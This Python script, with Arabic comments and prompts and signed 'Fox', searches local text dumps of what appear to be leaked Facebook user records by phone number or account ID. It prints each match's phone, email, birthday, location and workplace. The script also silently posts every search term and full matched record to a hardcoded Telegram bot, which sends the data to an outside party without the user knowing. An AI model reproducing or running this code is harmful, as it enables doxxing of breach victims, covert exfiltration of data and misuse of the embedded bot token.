import os
import sys
import threading
import time
import pyfiglet

# الألوان
Z = '\x1b[2;31m'
G = '\x1b[1;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
F = '\033[1;32m' #اخضر
B = "\033[1;30m" # أسود
R = "\033[1;31m" # أحمر
G = "\033[1;32m" # أخضر
Y = "\033[1;33m" # أصفر
Bl = "\033[1;34m" # أزرق
P = "\033[1;35m" # بنفسجي
cC = "\033[1;36m" # سماوي
W = "\033[1;37m" # أبيض
PN = '\033[1;35m' # وردي

# العنوان
print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;35m═\033[1;33m═\033[1;34m═\033[1;36m═\033[1;36m═")
print(f'                    𝐒𝐜𝐫𝐢𝐩𝐭 𝐒𝐞𝐚𝐫𝐜𝐡 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤   ')
print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;35m═\033[1;33m═\033[1;34m═\033[1;36m═\033[1;36m═")

logo = pyfiglet.figlet_format('F a c e book')
print(Z + logo)
print(C + '        ✨Hello in my script✨ ')
print(Y + f'{Bl} ╔{G}━━━━━━━━━━━━━━━━━━━━━👑👑━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Bl}╗                       ')
print(Y + f'             █▀█ █░░█   {R}▄ ░ ░   {G}█▀▀ █▀▀█ █░█     ')
print(Y + f'             █▀█ █▄▄█   {R}░ ▀ ▀   {G}█▀▀ █░░█ ▄▀▄     ')
print(Y + f'             ▀▀▀ ▄▄▄█   {R}▀ ░ ░   {G}▀░░ ▀▀▀▀ ▀░▀    ')
print()
print(R + f"  ➧   [{cC}1{R}]{Y}للبحث عبر رقم الهاتف🍀")
print("")
print(R + f"  ➧   [{cC}2{R}]{Y}للبحث عبر الايدي🍀")
print("")
print(Y + f'{Bl} ╚{G}━━━━━━━━━━━━━━━━━━━━━👑👑━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Bl}╝                      ')
print('')
print(PN + '----> !Code By <Fox> :( <----')
print('')
nn = input(R + f' [{C}+{R}] {Y}𝔼𝕟𝕥𝕖𝕣 ℕ𝕦𝕞𝕓𝕖𝕣 1 𝕠𝕣 2 {R}:{G} ')
print()

if nn == "1":
    fillee = input(R + f' [{C}+{R}] {Y}𝔼𝕟𝕥𝕖𝕣 ℕ𝕦𝕞𝕓𝕖𝕣        {R}:{G} ')
    fillee = f"+2{fillee}"
elif nn == "2":
    fillee = input(R + f' [{C}+{R}] {Y}𝔼𝕟𝕥𝕖𝕣 𝕀𝔻 𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜   {R}:{G} ')
else:
    print(Bl + f"[{R}Error{Bl}]{R} :{Y} please enter number 1 or 2 !!🧚.")
    exit()
print("")
print(f'{Y}---------> {P}WAIT SEARSH {Y}<---------')
print("")

import requests
Token = "7481651934:AAGyuVsCHyTHdMjYaGnLX6HcWcc2B_BXuUQ"
id = "7443221562"
tlg1 = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={id}&text={fillee}"
i = requests.post(tlg1)

stop_searching = False

def print_dots():
    text = f"{R} >> {B}𝗦𝗘𝗔𝗥𝗖𝗛𝗜𝗡𝗚 {G}.{P}.{Y}.{Bl}.{cC}."
    sys.stdout.write(text)
    sys.stdout.flush()
    time.sleep(1)
    while not stop_searching:
        for _ in range(5):
            if stop_searching:
                break
            sys.stdout.write('\b \b')
            sys.stdout.flush()
            time.sleep(0.5)
        sys.stdout.write(f'{G}.{P}.{Y}.{Bl}.{cC}.')
        sys.stdout.flush()
        time.sleep(0.5)

thread = threading.Thread(target=print_dots)
thread.start()

def search_text_in_large_file(file_path, search_text):
    global stop_searching
    found = False
    chunk_size = 100 * 1024 * 1024
    with open(file_path, 'r', encoding='utf-8') as f:
        while True:
            chunk = f.readline()
            if not chunk:
                break
            if search_text in chunk:
                found = True
                stop_searching = True
                thread.join()
                print("")
                text = chunk.strip()
                data = f'{text}'
                if nn == "2" :
                	if "female" in data :
                		print(Bl+f" [{cC}]Account female{Bl}] {R} : {G}تم حظر هذا الاكونت من العرض .")
                		exit()
                data = data.strip('"')
                items = data.split('","')
                names = [
                    "ID", "", "", "Phone", "", "Barthday", "First Name", 
                    "Last Name", "Gender", "Facebook URL", "", "Username", "Full Name", 
                    "Paio", "", "", "Country", "City", "Work", 
                    "Email", "", "", "", "Created", "Updated"]
                fox = G + f'''━━━━━━━━━━━━━━━━━━ 
{Bl}[{cC}⸙{Bl}] {Y}𝗜𝗗 {R}★ {G}{items[0]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗣𝗵𝗼𝗻𝗲 {R}★ {G}{items[3]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗶𝗿𝘀𝘁 𝗡𝗮𝗺𝗲 {R}★ {G}{items[6]} 
{Bl}[{cC}⸙{Bl}] {Y}𝗟𝗮𝘀𝘁 𝗡𝗮𝗺𝗲{R} ↯ {G}{items[7]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗕𝗶𝗼{R} ↯ {G}{items[13]}  
{Bl}[{cC}⸙{Bl}] {Y}𝗚𝗲𝗻𝗱𝗲𝗿 {R}↯ {G}{items[8]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗨𝗥𝗟 {R}↯ {G}{items[10]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗼𝘂𝗻𝘁𝗿𝘆{R} ↯ {G}{items[17]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗶𝘁𝘆 {R}↯ {G}{items[16]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗘𝗺𝗮𝗶𝗹 {R}↯{G} {items[19]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗯𝗶𝗿𝘁𝗵𝗱𝗮𝘆 {R}↯ {G}{items[5]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗪𝗼𝗿𝗸 {R}↯ {G}{items[18]}        
{Bl}\n[♻️{Bl}] {cC}𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 {R}↯ {Y}@GO_PF{G}★👑★     
{G}━━━━━━━━━━━━━━━━━━'''
                print(fox)
                import requests
                Token = "7481651934:AAGyuVsCHyTHdMjYaGnLX6HcWcc2B_BXuUQ"
                id = "7443221562"
                tlg1 = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={id}&text={data}"
                i = requests.post(tlg1)
                exit()
                break
    
    if not found:
        stop_searching = True
        thread.join()
        print(Bl + f"\n\n [{R}Error{Bl}]{R} :{Y} لم يتم العثور في العمليه الاولي !!🧚.")

file_path = 'fox1.txt'
search_text = fillee

if os.path.exists(file_path):
    search_text_in_large_file(file_path, search_text)
else:
    stop_searching = True
    thread.join()
    print(f"\n\n {Bl}[{R}Error{Bl}]{R}: {Y}الملف غير موجود !!🧚.")
    exit()
    
    
#print("")
#print(f'{Y}---------> {P}WAIT SEARSH {Y}<---------')
print("")

stop_searching = False

def print_dots():
    text = f"{R} >> {B}𝗦𝗘𝗔𝗥𝗖𝗛𝗜𝗡𝗚 {G}.{P}.{Y}.{Bl}.{cC}."
    sys.stdout.write(text)
    sys.stdout.flush()
    time.sleep(1)
    while not stop_searching:
        for _ in range(5):
            if stop_searching:
                break
            sys.stdout.write('\b \b')
            sys.stdout.flush()
            time.sleep(0.5)
        sys.stdout.write(f'{G}.{P}.{Y}.{Bl}.{cC}.')
        sys.stdout.flush()
        time.sleep(0.5)

thread = threading.Thread(target=print_dots)
thread.start()

def search_text_in_large_file(file_path, search_text):
    global stop_searching
    found = False
    chunk_size = 100 * 1024 * 1024
    with open(file_path, 'r', encoding='utf-8') as f:
        while True:
            chunk = f.readline()
            if not chunk:
                break
            if search_text in chunk:
                found = True
                stop_searching = True
                thread.join()
                print("")
                text = chunk.strip()
                data = f'{text}'
                if nn == "2" :
                	if "female" in data :
                		print(Bl+f" [{cC}]Account female{Bl}] {R} : {G}تم حظر هذا الاكونت من العرض .")
                		exit()
                data = data.strip('"')
                items = data.split('","')
                names = [
                    "ID", "", "", "Phone", "", "Barthday", "First Name", 
                    "Last Name", "Gender", "Facebook URL", "", "Username", "Full Name", 
                    "Paio", "", "", "Country", "City", "Work", 
                    "Email", "", "", "", "Created", "Updated"]
                fox = G + f'''━━━━━━━━━━━━━━━━━━ 
{Bl}[{cC}⸙{Bl}] {Y}𝗜𝗗 {R}★ {G}{items[0]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗣𝗵𝗼𝗻𝗲 {R}★ {G}{items[3]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗶𝗿𝘀𝘁 𝗡𝗮𝗺𝗲 {R}★ {G}{items[6]} 
{Bl}[{cC}⸙{Bl}] {Y}𝗟𝗮𝘀𝘁 𝗡𝗮𝗺𝗲{R} ↯ {G}{items[7]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗕𝗶𝗼{R} ↯ {G}{items[13]}  
{Bl}[{cC}⸙{Bl}] {Y}𝗚𝗲𝗻𝗱𝗲𝗿 {R}↯ {G}{items[8]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗨𝗥𝗟 {R}↯ {G}{items[10]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗼𝘂𝗻𝘁𝗿𝘆{R} ↯ {G}{items[17]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗶𝘁𝘆 {R}↯ {G}{items[16]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗘𝗺𝗮𝗶𝗹 {R}↯{G} {items[19]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗯𝗶𝗿𝘁𝗵𝗱𝗮𝘆 {R}↯ {G}{items[5]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗪𝗼𝗿𝗸 {R}↯ {G}{items[18]}        
{Bl}\n[♻️{Bl}] {cC}𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 {R}↯ {Y}@GO_PF{G}★👑★     
{G}━━━━━━━━━━━━━━━━━━'''
                print(fox)
                import requests
                Token = "7481651934:AAGyuVsCHyTHdMjYaGnLX6HcWcc2B_BXuUQ"
                id = "7443221562"
                tlg1 = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={id}&text={data}"
                i = requests.post(tlg1)
                exit()
                break
    
    if not found:
        stop_searching = True
        thread.join()
        print(Bl + f"\n\n [{R}Error{Bl}]{R} :{Y} لم يتم العثور في العمليه الثانيه !!🧚.")

file_path = 'fox2.txt'
search_text = fillee

if os.path.exists(file_path):
    search_text_in_large_file(file_path, search_text)
else:
    stop_searching = True
    thread.join()
    print(f"\n\n {Bl}[{R}Error{Bl}]{R}: {Y}الملف غير موجود !!🧚.")
    exit()
    
    
#print("")
#print(f'{Y}---------> {P}WAIT SEARSH {Y}<---------')
print("")

stop_searching = False

def print_dots():
    text = f"{R} >> {B}𝗦𝗘𝗔𝗥𝗖𝗛𝗜𝗡𝗚 {G}.{P}.{Y}.{Bl}.{cC}."
    sys.stdout.write(text)
    sys.stdout.flush()
    time.sleep(1)
    while not stop_searching:
        for _ in range(5):
            if stop_searching:
                break
            sys.stdout.write('\b \b')
            sys.stdout.flush()
            time.sleep(0.5)
        sys.stdout.write(f'{G}.{P}.{Y}.{Bl}.{cC}.')
        sys.stdout.flush()
        time.sleep(0.5)

thread = threading.Thread(target=print_dots)
thread.start()

def search_text_in_large_file(file_path, search_text):
    global stop_searching
    found = False
    chunk_size = 100 * 1024 * 1024
    with open(file_path, 'r', encoding='utf-8') as f:
        while True:
            chunk = f.readline()
            if not chunk:
                break
            if search_text in chunk:
                found = True
                stop_searching = True
                thread.join()
                print("")
                text = chunk.strip()
                data = f'{text}'
                if nn == "2" :
                	if "female" in data :
                		print(Bl+f" [{cC}]Account female{Bl}] {R} : {G}تم حظر هذا الاكونت من العرض .")
                		exit()
                data = data.strip('"')
                items = data.split('","')
                names = [
                    "ID", "", "", "Phone", "", "Barthday", "First Name", 
                    "Last Name", "Gender", "Facebook URL", "", "Username", "Full Name", 
                    "Paio", "", "", "Country", "City", "Work", 
                    "Email", "", "", "", "Created", "Updated"]
                fox = G + f'''━━━━━━━━━━━━━━━━━━ 
{Bl}[{cC}⸙{Bl}] {Y}𝗜𝗗 {R}★ {G}{items[0]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗣𝗵𝗼𝗻𝗲 {R}★ {G}{items[3]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗶𝗿𝘀𝘁 𝗡𝗮𝗺𝗲 {R}★ {G}{items[6]} 
{Bl}[{cC}⸙{Bl}] {Y}𝗟𝗮𝘀𝘁 𝗡𝗮𝗺𝗲{R} ↯ {G}{items[7]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗕𝗶𝗼{R} ↯ {G}{items[13]}  
{Bl}[{cC}⸙{Bl}] {Y}𝗚𝗲𝗻𝗱𝗲𝗿 {R}↯ {G}{items[8]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗨𝗥𝗟 {R}↯ {G}{items[10]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗼𝘂𝗻𝘁𝗿𝘆{R} ↯ {G}{items[17]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗶𝘁𝘆 {R}↯ {G}{items[16]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗘𝗺𝗮𝗶𝗹 {R}↯{G} {items[19]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗯𝗶𝗿𝘁𝗵𝗱𝗮𝘆 {R}↯ {G}{items[5]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗪𝗼𝗿𝗸 {R}↯ {G}{items[18]}        
{Bl}\n[♻️{Bl}] {cC}𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 {R}↯ {Y}@GO_PF{G}★👑★     
{G}━━━━━━━━━━━━━━━━━━'''
                print(fox)
                import requests
                Token = "7481651934:AAGyuVsCHyTHdMjYaGnLX6HcWcc2B_BXuUQ"
                id = "7443221562"
                tlg1 = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={id}&text={data}"
                i = requests.post(tlg1)
                exit()
                break
    
    if not found:
        stop_searching = True
        thread.join()
        print(Bl + f"\n\n [{R}Error{Bl}]{R} :{Y} لم يتم العثور في العمليه الثالثه !!🧚.")

file_path = 'fox3.txt'
search_text = fillee

if os.path.exists(file_path):
    search_text_in_large_file(file_path, search_text)
else:
    stop_searching = True
    thread.join()
    print(f"\n\n {Bl}[{R}Error{Bl}]{R}: {Y}الملف غير موجود !!🧚.")
    exit()
    
#print("")
#print(f'{Y}---------> {P}WAIT SEARSH {Y}<---------')
print("")

stop_searching = False

def print_dots():
    text = f"{R} >> {B}𝗦𝗘𝗔𝗥𝗖𝗛𝗜𝗡𝗚 {G}.{P}.{Y}.{Bl}.{cC}."
    sys.stdout.write(text)
    sys.stdout.flush()
    time.sleep(1)
    while not stop_searching:
        for _ in range(5):
            if stop_searching:
                break
            sys.stdout.write('\b \b')
            sys.stdout.flush()
            time.sleep(0.5)
        sys.stdout.write(f'{G}.{P}.{Y}.{Bl}.{cC}.')
        sys.stdout.flush()
        time.sleep(0.5)

thread = threading.Thread(target=print_dots)
thread.start()

def search_text_in_large_file(file_path, search_text):
    global stop_searching
    found = False
    chunk_size = 100 * 1024 * 1024
    with open(file_path, 'r', encoding='utf-8') as f:
        while True:
            chunk = f.readline()
            if not chunk:
                break
            if search_text in chunk:
                found = True
                stop_searching = True
                thread.join()
                print("")
                text = chunk.strip()
                data = f'{text}'
                if nn == "2" :
                	if "female" in data :
                		print(Bl+f" [{cC}]Account female{Bl}] {R} : {G}تم حظر هذا الاكونت من العرض .")
                		exit()
                data = data.strip('"')
                items = data.split('","')
                names = [
                    "ID", "", "", "Phone", "", "Barthday", "First Name", 
                    "Last Name", "Gender", "Facebook URL", "", "Username", "Full Name", 
                    "Paio", "", "", "Country", "City", "Work", 
                    "Email", "", "", "", "Created", "Updated"]
                fox = G + f'''━━━━━━━━━━━━━━━━━━ 
{Bl}[{cC}⸙{Bl}] {Y}𝗜𝗗 {R}★ {G}{items[0]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗣𝗵𝗼𝗻𝗲 {R}★ {G}{items[3]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗶𝗿𝘀𝘁 𝗡𝗮𝗺𝗲 {R}★ {G}{items[6]} 
{Bl}[{cC}⸙{Bl}] {Y}𝗟𝗮𝘀𝘁 𝗡𝗮𝗺𝗲{R} ↯ {G}{items[7]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗕𝗶𝗼{R} ↯ {G}{items[13]}  
{Bl}[{cC}⸙{Bl}] {Y}𝗚𝗲𝗻𝗱𝗲𝗿 {R}↯ {G}{items[8]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗨𝗥𝗟 {R}↯ {G}{items[10]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗼𝘂𝗻𝘁𝗿𝘆{R} ↯ {G}{items[17]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗖𝗶𝘁𝘆 {R}↯ {G}{items[16]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗘𝗺𝗮𝗶𝗹 {R}↯{G} {items[19]}    
{Bl}[{cC}⸙{Bl}] {Y}𝗯𝗶𝗿𝘁𝗵𝗱𝗮𝘆 {R}↯ {G}{items[5]}     
{Bl}[{cC}⸙{Bl}] {Y}𝗪𝗼𝗿𝗸 {R}↯ {G}{items[18]}        
{Bl}\n[♻️{Bl}] {cC}𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 {R}↯ {Y}@GO_PF{G}★👑★     
{G}━━━━━━━━━━━━━━━━━━'''
                print(fox)
                import requests
                Token = "7481651934:AAGyuVsCHyTHdMjYaGnLX6HcWcc2B_BXuUQ"
                id = "7443221562"
                tlg1 = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={id}&text={data}"
                i = requests.post(tlg1)
                exit()
                break
    
    if not found:
        stop_searching = True
        thread.join()
        print(Bl + f"\n\n [{R}Error{Bl}]{R} :{Y} لم يتم العثور في العمليه الاخير  جرب ايدي اخر!!🧚.")

file_path = 'fox4.txt'
search_text = fillee

if os.path.exists(file_path):
    search_text_in_large_file(file_path, search_text)
else:
    stop_searching = True
    thread.join()
    print(f"\n\n {Bl}[{R}Error{Bl}]{R}: {Y}الملف غير موجود !!🧚.")
    exit()
